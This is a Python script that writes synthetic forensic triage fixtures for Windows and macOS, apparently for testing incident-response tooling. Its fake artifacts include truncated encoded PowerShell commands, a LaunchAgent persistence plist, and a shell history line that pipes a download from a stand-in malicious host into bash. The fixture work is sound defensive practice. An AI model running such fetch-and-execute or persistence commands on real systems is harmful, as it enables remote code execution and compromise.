"""Generate synthetic fixtures - NO real evidence."""
import argparse, pathlib
p=argparse.ArgumentParser(); p.add_argument("--out", required=True); a=p.parse_args()
out=pathlib.Path(a.out)
# Windows fixture
w=out/"windows-triage"/"Windows"/"Prefetch"; w.mkdir(parents=True, exist_ok=True)
(w/"POWERSHELL.EXE-ABC123.pf").write_text("POWERSHELL.EXE run 3 times")
(out/"windows-triage"/"Users"/"demo"/"NTUSER.DAT").parent.mkdir(parents=True, exist_ok=True)
(out/"windows-triage"/"Users"/"demo"/"NTUSER.DAT").write_text("RunKey: powershell -enc SQBFAFgA... (demo)")
(out/"windows-triage"/"Security.evtx.txt").write_text("Event 4624 logon demo, Event 4104 powershell -enc aQBmACAAKABpAGMAZQ... demo\n")
# macOS fixture
m=out/"macos-triage"/"Users"/"demo"/"Library"/"LaunchAgents"; m.mkdir(parents=True, exist_ok=True)
(m/"com.evil.agent.plist").write_text("<plist><key>ProgramArguments</key><string>curl http://example-malicious.test/payload.sh</string></plist>")
(out/"macos-triage"/"Users"/"demo"/".zsh_history").write_text("curl -s http://example-malicious.test/x.sh | bash\n")
print("Fixtures created at", out)
